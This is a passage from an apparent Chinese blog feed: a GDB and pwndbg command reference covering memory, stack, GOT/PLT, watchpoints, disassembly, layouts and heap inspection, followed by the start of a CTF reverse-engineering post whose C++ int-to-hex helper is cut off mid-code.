align="left">d</td><td align="left">按十进制格式显示变量</td></tr><tr><td align="left">u</td><td align="left">按十六进制格式显示无符号整型</td></tr><tr><td align="left">o</td><td align="left">按八进制格式显示变量</td></tr><tr><td align="left">t</td><td align="left">按二进制格式显示变量</td></tr><tr><td align="left">a</td><td align="left">按十六进制格式显示变量</td></tr><tr><td align="left">c</td><td align="left">按字符格式显示变量</td></tr><tr><td align="left">f</td><td align="left">按浮点数格式显示变量</td></tr></tbody></table><blockquote><p>除此之外，s 可指定以字符串形式输出，i 可指定以汇编形式输出<br>例如：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token punctuation">(</span>gdb<span class="token punctuation">)</span> x/20s <span class="token variable">$rbp</span><span class="token punctuation">(</span>gdb<span class="token punctuation">)</span> x/20i <span class="token variable">$rip</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></blockquote><ul><li>u 表示从当前地址往后请求的字节数，如果不指定的话，GDB 默认是 4 字节，可指定的字节数格式如下：</li></ul><table><thead><tr><th align="left">格式</th><th align="left">含义</th></tr></thead><tbody><tr><td align="left">b</td><td align="left">以字节（8 位）格式打印</td></tr><tr><td align="left">h</td><td align="left">以半字（16 位）格式打印</td></tr><tr><td align="left">w</td><td align="left">以字（32 位）格式打印</td></tr><tr><td align="left">g</td><td align="left">以长字（64 位）格式打印</td></tr><tr><td align="left">s</td><td align="left">以零结尾的字符串格式打印</td></tr></tbody></table><ol><li>查看内存地址 0x0804a010 开始的 5 个内存数据，以十六进制格式输出</li></ol><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token punctuation">(</span>gdb<span class="token punctuation">)</span> x/5x 0x0804a010<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ol start="2"><li>从变量 len 的首地址开始，打印 4 个字节，以十六进制的形式</li></ol><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token punctuation">(</span>gdb<span class="token punctuation">)</span> x/4xb <span class="token operator">&amp;</span>len<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ol start="3"><li>查看栈空间的内容，输出 20 条，以字（32 位）格式输出</li></ol><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token punctuation">(</span>gdb<span class="token punctuation">)</span> x/20w <span class="token variable">$rbp</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><hr><h3 id="查看栈空间数据"><a href="#查看栈空间数据" class="headerlink" title="查看栈空间数据"></a>查看栈空间数据</h3><ol><li>查看程序栈空间的数据</li></ol><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token punctuation">(</span>pwndbg<span class="token punctuation">)</span> stack<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ol start="2"><li>显示 n 条栈空间数据</li></ol><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token punctuation">(</span>pwndbg<span class="token punctuation">)</span> stack n<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><hr><h3 id="查看栈上的返回地址"><a href="#查看栈上的返回地址" class="headerlink" title="查看栈上的返回地址"></a>查看栈上的返回地址</h3><ol><li>查看包含返回地址的栈地址</li></ol><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token punctuation">(</span>pwndbg<span class="token punctuation">)</span> retaddr<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><hr><h3 id="查看-Canary-的值"><a href="#查看-Canary-的值" class="headerlink" title="查看 Canary 的值"></a>查看 Canary 的值</h3><ol><li>查看栈上的 Canary 的值</li></ol><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token punctuation">(</span>pwndbg<span class="token punctuation">)</span> canary<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><hr><h3 id="查看-PLT-和-GOT-表"><a href="#查看-PLT-和-GOT-表" class="headerlink" title="查看 PLT 和 GOT 表"></a>查看 PLT 和 GOT 表</h3><ol><li>查看程序的 PLT 表</li></ol><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token punctuation">(</span>pwndbg<span class="token punctuation">)</span> plt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ol start="2"><li>查看程序的 GOT 表</li></ol><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token punctuation">(</span>pwndbg<span class="token punctuation">)</span> got<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><hr><h3 id="查看虚拟内存空间"><a href="#查看虚拟内存空间" class="headerlink" title="查看虚拟内存空间"></a>查看虚拟内存空间</h3><ol><li>查看程序各段地址的权限</li></ol><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token punctuation">(</span>gdb<span class="token punctuation">)</span> vmmap<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><hr><h2 id="修改程序内的数据"><a href="#修改程序内的数据" class="headerlink" title="修改程序内的数据"></a>修改程序内的数据</h2><blockquote><p>set 用于更改或设置各种调试器选项和变量，以自定义 gdb 的行为和功能，这些选项和变量可以影响调试会话的方式</p></blockquote><ol><li>通过 set 修改某个变量 num 的值为 1 （需在变量前加上 variable，可以简写为 var）</li></ol><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token punctuation">(</span>gdb<span class="token punctuation">)</span> <span class="token builtin class-name">set</span> variable <span class="token assign-left variable">num</span><span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">(</span>gdb<span class="token punctuation">)</span> <span class="token builtin class-name">set</span> var <span class="token assign-left variable">num</span><span class="token operator">=</span><span class="token number">1</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>修改数组元素的值同理</p><p>通过 print 指令也可以修改某个变量 num 的值为 1</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token punctuation">(</span>gdb<span class="token punctuation">)</span> print <span class="token assign-left variable">num</span><span class="token operator">=</span><span class="token number">1</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ol start="2"><li>修改存储地址在 <code>0x7fffffffde90</code>，指定类型为 int 的值为 1</li></ol><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token punctuation">(</span>gdb<span class="token punctuation">)</span> <span class="token builtin class-name">set</span> <span class="token punctuation">&#123;</span>int<span class="token punctuation">&#125;</span>0x7fffffffde90<span class="token operator">=</span><span class="token number">1</span><span class="token comment"># 修改前：</span><span class="token comment"># 0x7fffffffde90:0x010203040506</span><span class="token comment"># 修改后：</span><span class="token comment"># 0x7fffffffde90:0x010200000001</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>也可以通过指针来实现：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token punctuation">(</span>gdb<span class="token punctuation">)</span> <span class="token builtin class-name">set</span> *0x7fffffffde90<span class="token operator">=</span><span class="token number">1</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><blockquote><p><mark>注意：set 命令一次修改 4 个字节</mark></p><p>例如：将内存地址 <code>0x7fffffffde90</code> 处存放的 <code>0x010203040506</code> 改为 <code>0xabcdef070809</code></p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># 如果对内存数据不熟悉的话，可以先查看每个字节对应的地址（一般为小端序）</span><span class="token punctuation">(</span>gdb<span class="token punctuation">)</span> x/8xb<span class="token comment"># 输出为：</span><span class="token comment"># 0x7fffffffde90: 0x06 0x05 0x04 0x03 0x02 0x01 0x00 0x00</span><span class="token comment"># 则，对应的地址关系为：</span><span class="token comment"># 0x7fffffffde90 处存放 0x06，0x7fffffffde91 处存放 0x05，0x7fffffffde92 处存放 0x04 ...... 以此类推，0x7fffffffde97 处存放 0x00</span><span class="token comment"># 由于一次修改 4 字节，这里需要修改 6 字节（其实一个内存地址处一般存放的是 8 字节，这里的 6 字节其实最高位还有 2 字节为 0x00 0x00 省略没写），因此可以分为两步</span><span class="token comment"># 1. 首先修改低位的 4 字节</span><span class="token punctuation">(</span>gdb<span class="token punctuation">)</span> <span class="token builtin class-name">set</span> *0x7fffffffde90 <span class="token operator">=</span> 0xef070809<span class="token comment"># 2. 然后修改高位的 2 字节，如果加上最高位的 2 字节就是 0x0000abcd</span><span class="token punctuation">(</span>gdb<span class="token punctuation">)</span> <span class="token builtin class-name">set</span> *0x7fffffffde94 <span class="token operator">=</span> 0xabcd<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></blockquote><p>通过指针寄存器来指定内存地址，例如地址为 <code>rbp - 10</code>：（寄存器前注意加上 <code>&#39;$&#39;</code>）</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token punctuation">(</span>gdb<span class="token punctuation">)</span> <span class="token builtin class-name">set</span> <span class="token punctuation">&#123;</span>int<span class="token punctuation">&#125;</span><span class="token punctuation">(</span><span class="token variable">$rbp</span>-10<span class="token punctuation">)</span><span class="token operator">=</span><span class="token number">1</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>也可以通过指针来实现： <mark>（注意要转换 <code>$rbp-10</code> 的类型，使用 int 还是 long 根据程序位数来确定）</mark></p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token punctuation">(</span>gdb<span class="token punctuation">)</span> <span class="token builtin class-name">set</span> *<span class="token punctuation">((</span>unsigned int<span class="token punctuation">)</span><span class="token variable">$rbp</span>-10<span class="token punctuation">)</span><span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">(</span>gdb<span class="token punctuation">)</span> <span class="token builtin class-name">set</span> *<span class="token punctuation">((</span>unsigned long<span class="token punctuation">)</span><span class="token variable">$rbp</span>-10<span class="token punctuation">)</span><span class="token operator">=</span><span class="token number">1</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>具体变量的类型和地址可以通过 print 指令查看，例如变量 num：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token punctuation">(</span>gdb<span class="token punctuation">)</span> print <span class="token operator">&amp;</span>num<span class="token comment"># 输出为：</span><span class="token comment"># $1 = (int *) 0x7fffffffde90</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><ol start="3"><li>修改某个寄存器的值，例如：RAX</li></ol><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token punctuation">(</span>gdb<span class="token punctuation">)</span> <span class="token builtin class-name">set</span> var <span class="token variable">$rax</span><span class="token operator">=</span><span class="token number">1</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ol start="4"><li>指定函数运行时的参数，例如：10、20、30</li></ol><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token punctuation">(</span>gdb<span class="token punctuation">)</span> <span class="token builtin class-name">set</span> args <span class="token number">10</span> <span class="token number">20</span> <span class="token number">30</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>查看运行参数：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token punctuation">(</span>gdb<span class="token punctuation">)</span> shows args<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><hr><h2 id="查看-GDB-配置信息"><a href="#查看-GDB-配置信息" class="headerlink" title="查看 GDB 配置信息"></a>查看 GDB 配置信息</h2><blockquote><p>可以通过 show 指令来获取 GDB 本身设置相关的一些信息</p></blockquote><ol><li>查看设置好的运行参数</li></ol><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token punctuation">(</span>gdb<span class="token punctuation">)</span> show args<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ol start="2"><li>查看程序的运行路径</li></ol><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token punctuation">(</span>gdb<span class="token punctuation">)</span> show paths<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ol start="3"><li>查看环境变量</li></ol><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token punctuation">(</span>gdb<span class="token punctuation">)</span> show environment 变量名<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><hr><h2 id="监视程序"><a href="#监视程序" class="headerlink" title="监视程序"></a>监视程序</h2><h3 id="设置监视点"><a href="#设置监视点" class="headerlink" title="设置监视点"></a>设置监视点</h3><blockquote><p>watch 用于设置监视点可以监视变量的值，当变量的值发生更改时，gdb 会中断程序的执行，简写为：wat</p><p><strong>注意：当设置的观察点是一个局部变量时，局部变量失效后，观察点也会失效</strong></p></blockquote><ol><li>为某个变量或表达式设置监视点</li></ol><p>监视变量 variable 的值：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token punctuation">(</span>gdb<span class="token punctuation">)</span> <span class="token function">watch</span> variable<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>监视数组元素的值：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token punctuation">(</span>gdb<span class="token punctuation">)</span> <span class="token function">watch</span> array<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>监视表达式的值：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token punctuation">(</span>gdb<span class="token punctuation">)</span> <span class="token function">watch</span> variable + <span class="token number">5</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ol start="2"><li>指定条件监视点，只在特定条件 variable &#x3D;&#x3D; 42 满足时中断：</li></ol><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token punctuation">(</span>gdb<span class="token punctuation">)</span> <span class="token function">watch</span> variable <span class="token operator">==</span> <span class="token number">42</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><blockquote><p>监视点类似于断点，也可以通过 info 来进行查看，使用 delete 进行删除，管理方法与断点相同</p></blockquote><hr><h3 id="持续监视变量"><a href="#持续监视变量" class="headerlink" title="持续监视变量"></a>持续监视变量</h3><blockquote><p>display 设置要自动显示的变量、表达式或函数的值，而无需手动输入 print 命令，可以在调试过程中持续监视特定变量的值，简写为：disp</p><p>每次 gdb 中断，都会自动输出这些被监视变量或内存的值</p></blockquote><ol><li>为某个变量或表达式设置监视点</li></ol><p>监视变量 variable 的值：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token punctuation">(</span>gdb<span class="token punctuation">)</span> display variable<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>监视数组元素的值：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token punctuation">(</span>gdb<span class="token punctuation">)</span> display array<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>监视表达式的值：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token punctuation">(</span>gdb<span class="token punctuation">)</span> display variable + <span class="token number">5</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ol start="2"><li>删除设置的 display，假设编号为 index （可通过 <code>info display</code> 查看）</li></ol><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token punctuation">(</span>gdb<span class="token punctuation">)</span> undisplay index<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><hr><h2 id="查看源代码"><a href="#查看源代码" class="headerlink" title="查看源代码"></a>查看源代码</h2><blockquote><p>list 命令默认只会输出 10 行源代码，也可以使用如下命令修改：</p><p><code>show listsize</code>：查看 list 命令显示的代码行数<br><code>set listsize count</code>：设置 list 命令显示的代码行数为 count</p></blockquote><ol><li>列出程序的源代码，默认每次显示 10 行</li></ol><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token punctuation">(</span>gdb<span class="token punctuation">)</span> list<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ol start="2"><li>显示以行号 line 为中心的 10 行源代码（前后各 5 行）</li></ol><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token punctuation">(</span>gdb<span class="token punctuation">)</span> list line<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ol start="3"><li>显示函数名 fun_name 所在函数的源代码</li></ol><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token punctuation">(</span>gdb<span class="token punctuation">)</span> list fun_name<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ol start="4"><li>显示从行号 x - y 的源代码（没有显示 10 行的限制）</li></ol><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token punctuation">(</span>gdb<span class="token punctuation">)</span> list x,y<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><hr><h2 id="查看汇编代码"><a href="#查看汇编代码" class="headerlink" title="查看汇编代码"></a>查看汇编代码</h2><ol><li>将某个函数 <code>fun_name()</code> 完整反汇编</li></ol><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token punctuation">(</span>gdb<span class="token punctuation">)</span> disassemble fun_name<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ol start="2"><li>指定要反汇编的地址</li></ol><p>当仅指定一个地址 address1 时，将反汇编包含给定地址的整个函数，包括其上方的指令：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token punctuation">(</span>gdb<span class="token punctuation">)</span> disassemble address1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>指定要反汇编的起始地址 address1 和结束地址 address2，只会反汇编起始地址和结束地址之间的指令：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token punctuation">(</span>gdb<span class="token punctuation">)</span> disassemble address1,address2<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ol start="3"><li>指定从地址 address1 或函数 <code>fun_name()</code> 开始，长度为字节数 len 进行反汇编</li></ol><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token punctuation">(</span>gdb<span class="token punctuation">)</span> disassemble fun_name,+len<span class="token punctuation">(</span>gdb<span class="token punctuation">)</span> disassemble address1,+len<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><ol start="4"><li>同时显示函数 <code>fun_name()</code> 的反汇编指令和相对应的源代码</li></ol><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token punctuation">(</span>gdb<span class="token punctuation">)</span> disassemble /m fun_name<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ol start="5"><li>显示函数 <code>fun_name()</code> 的反汇编指令和汇编指令的字节码</li></ol><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token punctuation">(</span>gdb<span class="token punctuation">)</span> disassemble /r fun_name<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ol start="6"><li>显示 RIP 寄存器所在位置的汇编代码</li></ol><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token punctuation">(</span>gdb<span class="token punctuation">)</span> disassemble <span class="token variable">$rip</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><hr><h2 id="窗口布局"><a href="#窗口布局" class="headerlink" title="窗口布局"></a>窗口布局</h2><ol><li>分割窗口，可以一边查看代码，一边测试</li></ol><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token punctuation">(</span>gdb<span class="token punctuation">)</span> layout<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ol start="2"><li>显示源代码窗口</li></ol><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token punctuation">(</span>gdb<span class="token punctuation">)</span> layout src<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ol start="3"><li>显示反汇编窗口</li></ol><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token punctuation">(</span>gdb<span class="token punctuation">)</span> layout asm<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ol start="4"><li>显示源代码&#x2F;反汇编和 CPU 寄存器窗口</li></ol><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token punctuation">(</span>gdb<span class="token punctuation">)</span> layout regs<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ol start="5"><li>同时显示源代码和反汇编窗口</li></ol><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token punctuation">(</span>gdb<span class="token punctuation">)</span> layout <span class="token function">split</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ol start="6"><li>切换到下&#x2F;上一个布局模式</li></ol><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token punctuation">(</span>gdb<span class="token punctuation">)</span> layout next<span class="token punctuation">(</span>gdb<span class="token punctuation">)</span> layout prev<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><blockquote><p>一些关于窗口布局的快捷键：</p><ul><li>刷新窗口：Ctrl + L</li><li>显示一个窗口：先按下 Ctrl + X，然后松手，再单独按一个 1</li><li>显示两个窗口：先按下 Ctrl + X，然后松手，再单独按一个 2</li><li>关闭窗口布局：先按下 Ctrl + X，然后松手，再单独按一个 A</li></ul></blockquote><hr><h2 id="堆相关命令"><a href="#堆相关命令" class="headerlink" title="堆相关命令"></a>堆相关命令</h2><blockquote><p>以下命令主要适用于 pwndbg 插件</p><p>参考文章：<br><a href="https://www.cnblogs.com/murkuo/p/15965270.html">pwndbg 基本操作指令 - MuRKuo - 博客园</a><br><a href="https://blog.csdn.net/qq_39563369/article/details/103950922">pwndbg部分命令用法搬运_pwndbg vis-CSDN博客</a></p></blockquote><ol><li>显示 <code>main_arena</code> 特定地址的 <code>arena</code> 的详细信息</li></ol><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token punctuation">(</span>pwndbg<span class="token punctuation">)</span> arena<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>显示所有 <code>arena</code> 的基本信息：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token punctuation">(</span>pwndbg<span class="token punctuation">)</span> arenas<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token punctuation">(</span>pwndbg<span class="token punctuation">)</span> arenainfo<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ol start="2"><li>查看所有种类的 <code>bins</code> 堆块的链表情况</li></ol><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token punctuation">(</span>pwndbg<span class="token punctuation">)</span> bins<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>查看 <code>top_chunk</code> 的地址和大小：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token punctuation">(</span>pwndbg<span class="token punctuation">)</span> top_chunk<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>查看指定地址处的 <code>malloc_chunk</code>：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token punctuation">(</span>pwndbg<span class="token punctuation">)</span> malloc_chunk address fake   <span class="token comment"># 如果这个 chunk 是一个 fake chunk 的时候需要加上 fake 选项</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>单独查看 <code>fast bin</code> 链表：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token punctuation">(</span>pwndbg<span class="token punctuation">)</span> fastbins<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>单独查看 <code>large bin</code> 链表：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token punctuation">(</span>pwndbg<span class="token punctuation">)</span> largebins<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>单独查看 <code>small bin</code> 链表：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token punctuation">(</span>pwndbg<span class="token punctuation">)</span> smallbins<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>单独查看 <code>unsorted bin</code> 链表：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token punctuation">(</span>pwndbg<span class="token punctuation">)</span> unsortedbin<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>单独查看 <code>tcache bin</code> 链表：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token punctuation">(</span>pwndbg<span class="token punctuation">)</span> tcachebins<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>查看 malloc 线程缓存信息 <code>tcache</code> 的详细信息：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token punctuation">(</span>pwndbg<span class="token punctuation">)</span> tcache<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ol start="3"><li>以数据结构的形式显示所有堆块</li></ol><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token punctuation">(</span>pwndbg<span class="token punctuation">)</span> heap<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>可视化指定地址的堆块（默认大小为 10）：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token punctuation">(</span>pwndbg<span class="token punctuation">)</span> vis_heap_chunks<span class="token punctuation">(</span>pwndbg<span class="token punctuation">)</span> vis<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>查看堆的起始地址：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token punctuation">(</span>pwndbg<span class="token punctuation">)</span> heapbase<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>显示堆的信息：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># 和 bins 的挺像的，没有 bins 好用</span><span class="token punctuation">(</span>pwndbg<span class="token punctuation">)</span> heapinfo<span class="token punctuation">(</span>pwndbg<span class="token punctuation">)</span> heapinfoall<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>显示堆结构：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token punctuation">(</span>pwndbg<span class="token punctuation">)</span> parseheap<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>提示所有操作堆的地方：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token punctuation">(</span>pwndbg<span class="token punctuation">)</span> tracemalloc<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ol start="4"><li>打印出 Glibc 中的 <code>mp_ structure</code></li></ol><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token punctuation">(</span>pwndbg<span class="token punctuation">)</span> mp<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> 二进制漏洞利用 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Reverse </tag>
            
            <tag> Pwn </tag>
            
            <tag> GDB </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTF逆向中的脚本</title>
      <link href="/posts/3fff5269.html"/>
      <url>/posts/3fff5269.html</url>
      
        <content type="html"><![CDATA[<h1 id="int-型-gt-十六进制-string-型"><a href="#int-型-gt-十六进制-string-型" class="headerlink" title="int 型 -&gt; 十六进制 string 型"></a>int 型 -&gt; 十六进制 string 型</h1><h2 id="C-普通版"><a href="#C-普通版" class="headerlink" title="C++ 普通版"></a>C++ 普通版</h2><ul><li><p><strong>特点</strong></p><ol><li>以 <code>&#39;0x&#39;</code> 开头</li><li>转换后的字符串输出时可以保证长度都相同，位数不够的话高位补 0</li><li>结果以字符串形式输出</li></ol></li><li><p><strong>参数</strong></p></li></ul><table><thead><tr><th align="left">参数</th><th align="left">意义</th></tr></thead><tbody><tr><td align="left"><code>num</code></td><td align="left">待转换的 int 型数据</td></tr><tr><td align="left"><code>width</code></td><td align="left">指定转换后得到的十六进制 string 型的长度，不包括 <code>&#39;0x&#39;</code>，位数不够的话高位补 0</td></tr></tbody></table><ul><li><strong>代码</strong></li></ul><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;sstream></span></span>std<span class="token double-colon punctuation">::</span>string <span class="token function">int_to_string</span><span class="token punctuation">(</span><span class="token keyword">int</span> num<span class="token punctuation">,</span> <span class="token keyword">int</span> width<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>std<span class="token double-colon punctuation">::</span>stringstream ioss<span class="token punctuation">;</span>     <span class="token comment">// 定义字符串流</span>std<span class="token double-colon punctuation">::</span>string s_temp<span class="token punctuation">;</span>         <span class="token comment">// 存放转化后字符</span>ioss <span class="token operator">&lt;&lt;</span> std<span class="token double-colon punctuation">::</span>hex <span class="token operator">&lt;&lt;</span> num<span class="token punctuation">;</span>      <span class="token comment">// 以十六制形式输出</span>ioss <span class="token operator">>></span> s_temp<span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span>width <span class="token operator">></span> s_temp<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    std<span class="token double-colon punctuation">::</span>string <span class="token function">s_0</span><span class="token punctuation">(</span>width <span class="token operator">-</span> s_temp<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token char">'0'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token comment">// 位数不够则补0</span>    s_temp <span class="token operator">=</span> s_0 <span class="token operator">+</span> s_temp<span class="token punctuation">;</span>                            <span class="token comment">// 合并</span><span class="token 